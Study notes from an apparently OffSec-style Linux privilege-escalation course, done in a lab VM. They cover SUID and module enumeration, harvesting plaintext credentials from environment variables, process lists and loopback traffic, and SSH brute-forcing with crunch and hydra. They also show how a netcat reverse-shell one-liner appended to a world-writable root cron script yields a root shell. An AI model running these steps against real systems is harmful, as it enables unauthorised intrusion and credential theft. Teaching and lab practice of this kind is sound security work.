systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=34,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=9209)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1001,gid=1001)
```
- The output show the swap part and primary ext4 disk.
 - *Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it's good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.*.

We can then use `lsblk` to view all disks.
```bash
joe@debian-privesc:~$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   32G  0 disk 
├─sda1   8:1    0   31G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom 
```
- Sda consists of 3 parts.
- Showing info for all disks may reveal parts that are not mounted.
 - Depending on config, we may be able to mount these and search for info.

Another common method is to exploit device drivers and kernel modules, let's examine enumeration techniques.  Enumerate modules loaded on target with `lsmod`.
```bash
joe@debian-privesc:~$ lsmod
Module                  Size  Used by
binfmt_misc            20480  1
crct10dif_pclmul       16384  0
vmw_balloon            20480  0
crc32_pclmul           16384  0
joydev                 24576  0
ghash_clmulni_intel    16384  0
serio_raw              16384  0
pcspkr                 16384  0
sg                     36864  0
vmw_vsock_vmci_transport    32768  1
vsock                  40960  2 vmw_vsock_vmci_transport
vmw_vmci               81920  2 vmw_balloon,vmw_vsock_vmci_transport
evdev                  28672  6
ac                     16384  0
nft_counter            16384  1
xt_tcpudp              16384  1
nft_compat             20480  1
nf_tables             143360  5 nft_compat,nft_counter
nfnetlink              16384  2 nft_compat,nf_tables
parport_pc             32768  0
ppdev                  20480  0
lp                     20480  0
parport                57344  3 parport_pc,lp,ppdev
ip_tables              28672  0
x_tables               45056  3 nft_compat,xt_tcpudp,ip_tables
autofs4                49152  2
ext4                  749568  1
crc16                  16384  1 ext4
mbcache                16384  1 ext4
jbd2                  122880  1 ext4
crc32c_generic         16384  0
fscrypto               32768  1 ext4
ecb                    16384  0
sr_mod                 28672  0
cdrom                  65536  1 sr_mod
ata_generic            16384  0
crc32c_intel           24576  2
sd_mod                 61440  3
vmwgfx                331776  3
aesni_intel           200704  0
ttm                   126976  1 vmwgfx
drm_kms_helper        208896  1 vmwgfx
ata_piix               36864  0
aes_x86_64             20480  1 aesni_intel
crypto_simd            16384  1 aesni_intel
cryptd                 28672  3 crypto_simd,ghash_clmulni_intel,aesni_intel
glue_helper            16384  1 aesni_intel
drm                   495616  6 vmwgfx,drm_kms_helper,ttm
psmouse               172032  0
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
vmxnet3                69632  0
i2c_piix4              24576  0
button                 20480  0
```

Once we list loaded mods and ID interesting ones, we can see more info with `modinfo` (requires full path to run).
```bash
joe@debian-privesc:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     00E4F01BB3AA2AAF98137BF
depends:        scsi_mod
retpoline:      Y
intree:         Y
name:           libata
vermagic:       4.19.0-21-amd64 SMP mod_unload modversions 
sig_id:         PKCS#7
signer:         Debian Secure Boot CA
sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
sig_hashalgo:   sha256
signature:      89:BC:89:3C:6B:C9:55:B9:EC:9C:AD:D8:8A:76:C5:0D:8C:F0:88:26:
		2C:09:B9:36:34:FE:B0:5D:0D:84:BA:10:B9:12:3A:C6:41:C5:90:66:
		46:09:7B:33:91:7B:E6:E3:F2:F7:B9:E7:5D:E7:E1:F9:8D:8F:DF:31:
		21:47:B3:76:90:4E:F1:45:2E:65:6F:63:61:B9:5D:53:40:84:96:F5:
		61:1A:1A:2D:EF:5B:82:65:BD:24:60:AD:DB:68:60:F8:F2:3F:CD:11:
		DC:D5:7B:61:81:A3:6C:95:46:09:6C:CB:F0:66:FC:40:55:17:F2:71:
		7F:B8:43:0B:07:2A:79:FB:A7:CD:FF:C6:34:4D:78:5B:71:53:2C:0F:
		0A:BC:AE:3C:6F:38:3A:5E:CB:26:96:6B:9B:C7:BE:C7:6F:C8:9D:88:
		93:61:B9:12:2F:AC:4B:D1:F0:23:30:AD:A5:B1:30:A7:4A:EA:96:5F:
		26:DF:B3:73:AD:00:3D:B5:9D:B1:3C:C7:01:D9:A8:86:73:EE:A8:4D:
		2B:62:AD:2B:B8:DE:0A:33:F6:3D:13:29:36:17:A7:14:F1:C5:C5:11:
		37:60:52:31:9E:B4:BD:B1:64:A5:5E:47:3E:D2:5F:77:89:74:2E:E2:
		47:5B:22:34:C7:F7:A5:81:A1:BF:BA:72:A0:E5:CF:69
parm:           zpodd_poweroff_delay:Poweroff delay for ZPODD in seconds (int)
parm:           acpi_gtf_filter:filter mask for ACPI _GTF commands, set to filter out (0x1=set xfermode, 0x2=lock/freeze lock, 0x4=DIPM, 0x8=FPDMA non-zero offset, 0x10=FPDMA DMA Setup FIS auto-activate) (int)
parm:           force:Force ATA configurations including cable type, link speed and transfer mode (see Documentation/admin-guide/kernel-parameters.rst for details) (string)
parm:           atapi_enabled:Enable discovery of ATAPI devices (0=off, 1=on [default]) (int)
parm:           atapi_dmadir:Enable ATAPI DMADIR bridge support (0=off [default], 1=on) (int)
parm:           atapi_passthru16:Enable ATA_16 passthru for ATAPI devices (0=off, 1=on [default]) (int)
parm:           fua:FUA support (0=off [default], 1=on) (int)
parm:           ignore_hpa:Ignore HPA limit (0=keep BIOS limits, 1=ignore limits, using full disk) (int)
parm:           dma:DMA enable/disable (0x1==ATA, 0x2==ATAPI, 0x4==CF) (int)
parm:           ata_probe_timeout:Set ATA probing timeout (seconds) (int)
parm:           noacpi:Disable the use of ACPI in probe/suspend/resume (0=off [default], 1=on) (int)
parm:           allow_tpm:Permit the use of TPM commands (0=off [default], 1=on) (int)
parm:           atapi_an:Enable ATAPI AN media presence notification (0=0ff [default], 1=on) (int)
```
- This info better positions us to find appropriate exploits.

There are a few enumerations to be aware of that may provide a **shortcut to PriveEsc**.  Other than `rwx` file perms there are two *special rights* pertaining to exec files:
- `setuid` and `setgid`
 - Symbolized with upper or lower case `s`
 - Allows current user to exec the file with rights of the owner (setuid) or the owner's group (setgid)

When run, an exec normally inherits the rights of the user that runs it.  If SUID perms are set, the bin will run with the perms of the file owner.
- If a bin has the SUID bit set and the owner is root.
 - Local user exec that bin with elevated priv.
- When user or automate script launches SUID app.
 - It inherits the UID/GID of initiating script.
  - Known as the **"effective UID/GID" or eUID/eGID**.
   - Which is the user the OS verifies to grant perms for the action.
- Manage to subvert a setuid root program to call a command of choice.
 - Effectively impersonate the root user.
 - Common method of PrivEsc.

We can use `find` to search for SUID-marked bins:
- `/` search root.
- `-type f` for files.
- `-perm -u=s` with SUID bit set.
- `2>/dev/null` discard errors.
```bash
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```
- We found server SUID bins.
- Exploitation varies on several factors.
 - If `/bin/cp` were SUID we could copy/overwrite sensitive files like `/etc/passwd`

A full list of Linux PrivEsc techniques can be found in a compendium by g0tmi1k as well as many other resources:
- [G0tmi1k compendium](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
- [Swissky](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Carlos Polop](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

###### Exercises

Connect to VM 2 with the provided credentials. The flag is inside one of the SUID binaries available on the system.
**Use "strings" to display readable strings in bin**
```bash
joe@debian-privesc:~$ strings /usr/bin/passwd_flag
/lib64/ld-linux-x86-64.so.2
mfUa
libpam.so.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
pam_start
pam_strerror
pam_chauthtok
pam_end
libpam_misc.so.0
misc_conv
libaudit.so.1
_fini
_init
libselinux.so.1
is_selinux_enabled
security_getenforce
context_user_get
security_compute_av
matchpathcon
freecon
context_free
setfscreatecon
context_new
getprevcon
libc.so.6
setuid
chroot
fflush
strcpy
fchmod
__printf_chk
exit
_IO_putc
setlocale
fopen
strncmp
optind
getpwent
strrchr
setregid
perror
dcgettext
signal
strncpy
fork
setreuid
__stack_chk_fail
__lxstat
unlink
putspent
realloc
fsync
stdin
strtoll
getpid
kill
strspn
strdup
strftime
__assert_fail
gmtime
endpwent
strtol
feof
fgets
calloc
strlen
openlog
memset
strcspn
__errno_location
fseek
chdir
read
__syslog_chk
__fprintf_chk
getgrnam
getpwuid_r
fchown
stdout
fputc
fputs
fclose
strtoul
malloc
umask
strcasecmp
realpath
__fgets_chk
__strncpy_chk
getgid
getspnam
__ctype_b_loc
__open_2
optarg
stderr
__snprintf_chk
getlogin
getuid
execve
setrlimit
getopt_long
getpwnam_r
__fxstat
fileno
rename
geteuid
__memcpy_chk
waitpid
sgetspent
strchr
utime
fdopen
qsort
__cxa_finalize
fcntl
__xstat
bindtextdomain
access
_IO_getc
ulckpwdf
strcmp
__libc_start_main
setpwent
ferror
write
closelog
snprintf
putpwent
__environ
_edata
__bss_start
LIBPAM_MISC_1.0
LIBPAM_1.0
GLIBC_2.3
GLIBC_2.4
GLIBC_2.7
GLIBC_2.3.4
GLIBC_2.2.5
D$81
T$8dH3
H[]A\A]A^A_
\$ 1
|$ H
l$ L
u/UH
ATUS
AWAVAUATI
AVAU
[]A\A]A^A_
<*tE<!tA
;!ukH
?!uG
ATUS
AWAVAUI
ATUSH
H;\$
[]A\A]A^A_
[]A\A]A^A_
[]A\A]A^A_
AWAVAUATUSH
[]A\A]A^A_
AVAUATUSH
[]A\A]A^A_
AWE1
AVAUA
[]A\A]A^A_
AWAVI
AUATUSH
L9d$
?"u%H
([]A\A]A^A_
AWAVA
AUATUSH
L9d$
?"u%H
([]A\A]A^A_
"t	I
[]A\
D$81
|$ H
L$8dH3
D$81
D$ H
D$(H
D$0H
\$8dH3
tbUH
ATUH
[]A\
[]A\
[]A\A]A^
tSATI
[]A\
AVAUATI
[]A\A]A^
[]A\A]A^
AWAVAUATUSH
[]A\A]A^A_
AWAVAUA
ATUSH
[]A\A]A^A_
T$ H
T$ H
LcL$
AWAVAUATU
P(L9
[]A\A]A^A_
AVAUATUSH
[]A\A]A^A_
AWAVAUATUSH
[]A\A]A^A_
AVAUATUS
]A\A]A^
[]A\A]A^
[]A\A]A^
AUATUSH
[]A\A]
[]A\A]
[]A\A]
[]A\A]
AUATI
[]A\A]
[]A\A]
[]A\A]
AVAUI
ATUSH
[]A\A]A^
ATUSH
[]A\A]
[]A\
[]A\
[]A\
[]A\
dH3<%(
[]A\
dH3<%(
[]A\
dH3<%(
[]A\
"t	I
[]A\
AWAVI
AUATL
[]A\A]A^A_
Usage: %s [options] [LOGIN]
Options:
OS{17c5475686f3dd59a90be4dca6fdcf85}
  -a, --all                     report password status on all accounts
  -d, --delete                  delete the password for the named account
  -e, --expire                  force expire the password for the named account
  -h, --help                    display this help message and exit
  -k, --keep-tokens             change password only if expired
  -i, --inactive INACTIVE       set password inactive after expiration
                                to INACTIVE
  -l, --lock                    lock the password of the named account
  -n, --mindays MIN_DAYS        set minimum number of days before password
                                change to MIN_DAYS
  -q, --quiet                   quiet mode
  -r, --repository REPOSITORY   change password in REPOSITORY repository
  -R, --root CHROOT_DIR         directory to chroot into
  -S, --status                  report password status on the named account
  -u, --unlock                  unlock the password of the named account
  -w, --warndays WARN_DAYS      set expiration warning days to WARN_DAYS
  -x, --maxdays MAX_DAYS        set maximum number of days before password
                                change to MAX_DAYS
%s: unlocking the password would result in a passwordless account.
You should set a password with usermod -p to unlock the password of this account.
%s: cannot lock %s; try again later.
%s: user '%s' does not exist in %s
%s: failed to prepare the new %s entry '%s'
%s: failure while writing changes to %s
failure while writing changes to %s
%s: invalid numeric argument '%s'
%s: repository %s not supported
%s: Cannot determine your user name.
Cannot determine the user name of the caller (UID %lu)
%s is not authorized to change the password of %s
%s: %s is not authorized to change the password of %s
%s: You may not view or modify password information for %s.
%s: can't view or modify password information for %s
password for '%s' changed by '%s'
%s: password expiry information changed.
%s: failed to unlock %s
failed to unlock %s
%s: out of memory
%m/%d/%Y
%s %s %s %lld %lld %lld %lld
%s %s
%s: cannot open %s
cannot open %s
Unknown user context
/usr/share/locale
shadow
passwd
files
adehi:kln:qr:R:Suw:x:
%s: Permission denied.
%s: user '%s' does not exist
Cannot change ID to root.
can't setuid(0)
group
delete
expire
help
inactive
keep-tokens
mindays
quiet
repository
status
unlock
warndays
maxdays
%s=%s
env.c
wlen == (int) len -1
Environment overflow
You may not change $%s
LANG=
LANGUAGE=
_RLD_=
BASH_ENV=
HOME=
IFS=
KRB_CONF=
LIBPATH=
MAIL=
NLSPATH=
SHELL=
SHLIB_PATH=
addenv
passwd: %s
passwd: password unchanged
passwd: pam_start() failed, error %d
passwd: password updated successfully
--root
%s: multiple --root options
%s: invalid chroot path '%s'
%s: option '%s' requires an argument
%s: failed to drop privileges (%s)
%s: cannot access chroot directory %s: %s
%s: cannot chdir to chroot directory %s: %s
%s: unable to chroot to directory %s: %s
xgetpwnam
xgetpwuid
%s: failed to allocate memory: %s
/usr/sbin/nscd
%s: Failed to flush the nscd cache.
%s: nscd did not terminate normally (signal %d)
%s: nscd exited with status %d
FORCE_SHADOW
%s: cannot execute %s: %s
commonio.c
NULL != eptr
realpath in lrename()
%s.%lu
%s.lock
%s: %s: %s
%s: cannot get lock %s: %s
%s: %s: lock file already used
%s: existing lock file %s without a PID
%s: existing lock file %s with an invalid PID '%s'
%s: lock %s already used by PID %lu
Multiple entries named '%s' in %s. Please fix this with pwck or grpck.
write_all
	%s [%s]: 
configuration error - unknown item '%s' (notify administrator)
unknown configuration item `%s'
Could not allocate space for config info.
could not allocate space for config info
cannot open login definitions %s [%s]
cannot read login definitions %s [%s]
configuration error - cannot parse %s value: '%s'
CHFN_AUTH
CHSH_AUTH
CRACKLIB_DICTPATH
ENV_HZ
ENVIRON_FILE
ENV_TZ
FAILLOG_ENAB
ISSUE_FILE
LASTLOG_ENAB
LOGIN_STRING
MAIL_CHECK_ENAB
MOTD_FILE
NOLOGINS_FILE
OBSCURE_CHECKS_ENAB
PASS_ALWAYS_WARN
PASS_CHANGE_TRIES
PASS_MAX_LEN
PASS_MIN_LEN
PORTTIME_CHECKS_ENAB
QUOTAS_ENAB
SU_WHEEL_ONLY
ULIMIT
CHFN_RESTRICT
CONSOLE_GROUPS
CONSOLE
CREATE_HOME
DEFAULT_HOME
ENCRYPT_METHOD
ENV_PATH
ENV_SUPATH
ERASECHAR
FAKE_SHELL
FTMP_FILE
HUSHLOGIN_FILE
KILLCHAR
LOGIN_RETRIES
LOGIN_TIMEOUT
LOG_OK_LOGINS
LOG_UNKFAIL_ENAB
MAIL_DIR
MAIL_FILE
MAX_MEMBERS_PER_GROUP
MD5_CRYPT_ENAB
PASS_MAX_DAYS
PASS_MIN_DAYS
PASS_WARN_AGE
SHA_CRYPT_MAX_ROUNDS
SHA_CRYPT_MIN_ROUNDS
SUB_GID_COUNT
SUB_GID_MAX
SUB_GID_MIN
SUB_UID_COUNT
SUB_UID_MAX
SUB_UID_MIN
SULOG_FILE
SU_NAME
SYS_GID_MAX
SYS_GID_MIN
SYS_UID_MAX
SYS_UID_MIN
TTYGROUP
TTYPERM
TTYTYPE_FILE
UMASK
USERDEL_CMD
USERGROUPS_ENAB
SYSLOG_SG_ENAB
SYSLOG_SU_ENAB
;*3$"
/etc/passwd
/etc/shadow
/etc/login.defs
0e83d497675cb24e003f9d993c1770502483e8.debug
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.gnu_debuglink
```


##### Automated Enumeration

To obtain an initial baseline of the target, we can use `unix-privesc-check` on UNIX derivatives like Linux.  This is pre installed on Kali and available at `/usr/bin/unix-privesc-check`.  It performs a number of checks to find any sys misconfigs that can be leveraged for PrivEsc.  Run the script without any args to review the tool's details.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ /usr/bin/unix-privesc-check              
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

"standard" mode: Speed-optimised check of lots of security settings.

"detailed" mode: Same as standard mode, but also checks perms of open file
                 handles and called files (e.g. parsed from shell scripts,
                 linked .so files).  This mode is slow and prone to false 
                 positives but might help you find more subtle flaws in 3rd
                 party programs.

This script checks file permissions and other settings that could allow
local users to escalate privileges.

Use of this script is only permitted on systems which you have been granted
legal permission to perform a security assessment of.  Apart from this 
condition the GPL v2 applies.

Search the output for the word 'WARNING'.  If you don't see it then this
script didn't find any problems.
```
- The script has two modes.
	- `standard`
  - Performs a speed optimized process and should reduce the number of false positives.
	- `detailed`
  - Also checks perms of open file handles and called files.  slow and prone to false positive, but may help to find subtle flaws in 3rd party programs.

In this example we will transfer the script to the target and use `standard` mode, redirect the output to a file called `output.txt`.
```bash
joe@debian-privesc:~$ bash unix-privesc-check standard > output.txt
```

The script performs numerous checks for permissions on common files.  The following excerpt reveals config files writable by normal users.
```
############################################
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
WARNING: /etc/sudoers is a critical config file. World write is set for /etc/sudoers
    Checking if anyone except root can change /etc/shadow
```
- The output shows anyone can edit `/etc/passwd`
 - This easily allows an attacker to PrivEsc or create accounts on the target.

There are many other tools worth studying, which have been actively developed and enhanced over years.
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

All of these tools perform many automated checks, but we should remember that every system is different, one-off system changes can be missed by automated tools.  It is always important to check for unique configs that can only be enumerated manually.

#### Exposed Confidential Information 17.2

- Understand user history files.
- Inspect user trails for credential harvesting.
- Inspect system trails for credential harvesting.

##### Inspecting User Trails

There are often time constraints during engagements, always focus efforts on low hanging fruit first.

The target's user `history` file often hold clear-text user activity that may include sensitive info, such as passwords or other auth details.

On Linux, applications frequently store user-specific config files and sub-dirs in the user home dir.  Often called "dotfiles", they are prepended with a ".", instructing the system not to display the files when listing with basic commands.

One example is the `.bashrc`, which is executed on new terminal windows from existing login sessions or when a new shell instance is started.  Withing the script, env vars can be set when a new user shell is spawned.

Sys admins sometimes store creds in env vars to interact with custom scripts requiring auth.  If we review the env vars of our lab Vm we will notice an unusual env var:
```bash
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```
- The `SCRIPT_CREDENTIAL` var holds something resembling a password.

To confirm this is a permanent var, inspect the `.bashrc` conf file.
```bash
joe@debian-privesc:~$ cat .bashrc | grep export
export SCRIPT_CREDENTIALS="lab"
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
```
- The var holding the pass is exported when the user shell starts.
*Storing a clear-text password inside an environment variable is not considered a secure best practice. To safely authenticate with an interactive script, it's recommended to adopt public key authentication and protect private keys with passphrases.*

Let's try to PrivEsc by directly entering the password we discovered.
```bash
joe@debian-privesc:~$ su - root
Password: 
root@debian-privesc:~# whoami
root
```

Instead of going directly for the root account, we could try to access user `eve` we previously discovered.  We can try building a custom dict from know passwords to attempt to brute force eve's account.

We can generate the wordlist with the `crunch` CLI tool.  Set min and max len to `6` chars, specify pattern with `-t`, then hard code the first 3 chars to `lab`, followed by 3 digits.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ crunch 6 6 -t Lab%%% > wordlist  
Crunch will now generate the following amount of data: 7000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ head wordlist                                     
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
```

Since the target runs an SSH server, we can attempt our attack with Hydra.
- Username `-l`
- Wordlist `-P`
- Target IP.
- Set target as `ssh`
- Verbose `-V`
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ hydra -l eve -P wordlist 192.168.234.214 -t 4 ssh -V             
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 07:19:28
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
[DATA] attacking ssh://192.168.234.214:22/
...
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
1 of 1 target successfully completed, 1 valid password found
```

Hydra succeeds and we can login as `eve` via SSH:
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
eve@192.168.234.214's password: 
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
eve@debian-privesc:~$ whoami
eve
```

We can verify we are running as a priv user with `sudo -l`
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
eve@192.168.234.214's password: 
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
eve@debian-privesc:~$ whoami
eve
eve@debian-privesc:~$ sudo -l
[sudo] password for eve: 
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

Since `eve` is an admin user, we can run commands with elev priv.  We can elevate to root with `sudo -i`
```bash
eve@debian-privesc:~$ sudo -i
root@debian-privesc:~# whoami
root
```


##### Inspecting Service Footprints

System daemons are Linux services, spawned at boot, to perform specific tasks without user interaction.  Linux servers often start many daemons:
- Secure Shell (SSH) access is often restricted to specific users; capturing keys or agent sockets from writable directories can unlock lateral pivots.
- Web server.
- Database configuration files frequently harbor production credentials; note file owners and permissions so defenders can tighten storage practices.
- Etc.
Sys admins often rely on custom daemons to automate tasks and often neglect security best-practices.  As part of enum, we inspect the behavior of running procs to hunt for anomalies the may lead to PrivEsc.

Unlike Win, Linux sllows us to list info about higher-priv procs like those running in the root context.  We can enum all procs with `ps` , refresh every second with `watch`, and `grep` for the word "pass":
```bash
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```
- The admin has configured a sys daemon to conn to local sys with the `eve` user creds in clear text.
- The proc is running as root, but we can still inspect it.

Another holistic angle we should consider, is if we have the ability to capture network traffic.  For CLI packet capture we can use `tcpdump`, it requires admin priv as it operates on raw sockets.  It is not uncommon to find IT accounts have been given access to this tool for troubleshooting.

We can run `tcpdump` as user `joe` who has specific sudo perms to run it.  Let's try to capture traffic on the loopback iface:
- Dump contents in ASCII with `-A`
- Filter for "pass" with `grep`
```bash
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+...+...user:root,pass:lab -
+...+...user:root,pass:lab -
```
- After several seconds we get the root user pass in clear text!

#### Insecure File Permissions 17.3
 
- Abuse insecure cron jobs to escalate privileges.
- Abuse insecure file permissions to escalate privileges.

##### Abusing Cron Jobs

Insecure file perms can be leveraged for PrivEsc.  Assume we already gained access to a Linux target as an unpriv user.

To leverage, we must locate an exec file that allows us write access and runs at elev priv.  The cron time based job scheduler is a prime target.  Sys level cron jobs exec with root priv and sys admins often create scripts with insecure perms.

SSH into our example target VM1 as `joe` user and check for installed cron jobs.
```bash
joe@debian-privesc:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
...
# m h  dom mon dow   command

joe@debian-privesc:~$ sudo crontab -l
[sudo] password for joe: 
...
# m h  dom mon dow   command
* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
Nov  1 10:11:46 debian-privesc CRON[1226]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Nov  1 10:12:01 debian-privesc CRON[1280]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
- A script `user_backup.sh` under `/home/joe` is exec in root context.
- It appears to run every minute.

We can inspect the contents of the script:
```bash
joe@debian-privesc:~$ cat .scripts/user_backups.sh 
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lha .scripts/user_backups.sh 
-rwxrwxrw- 1 root root 50 Aug 25  2022 .scripts/user_backups.sh
```
- The script copies the user's home dir to the backups subdir.
- The perms show local users can write to the file.

Since an unpriv user can modify the contents of the backup script, we can edit and add a reverse shell one-liner.  If it succeeds, we will receive a root priv rev shell on our attacking machine after one minute at most.
```bash
joe@debian-privesc:~/.scripts$ cat user_backups.sh 
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.182 4444 >/tmp/f" >> user_backups.sh 
joe@debian-privesc:~/.scripts$ cat user_backups.sh 
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.182 4444 >/tmp/f
```

Start the listener on our attacking machine.
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.248.214] 35340
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

As shown, the cron job executed our reverse shell one-liner and we achieve PrivEsc with a root shell on the target.

##### Abusing Password Authentication

Passwords are generally stored in `/etc/shadow` (not readable by normal user) when there are no centralized credential systems, such as AD or LDAP, in use.  Historically, hashes and account info were stored in the world readable `/etc/passwd`.  For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record it is valid for auth and takes precedence over the entry in `/etc/shadow` if present.  Therefore, if we can write into `/etc/passwd` we can set an arbitrary password for any account.

Previously we have seen that the Debian Vm may be vulnerable to PrivEsc due to `/etc/passwd` perms being improperly set.  We can PrivEsc by adding another superuser, `root2`, and corresponding password hash to `/etc/passwd`.
- Generate password hash with `openssl`
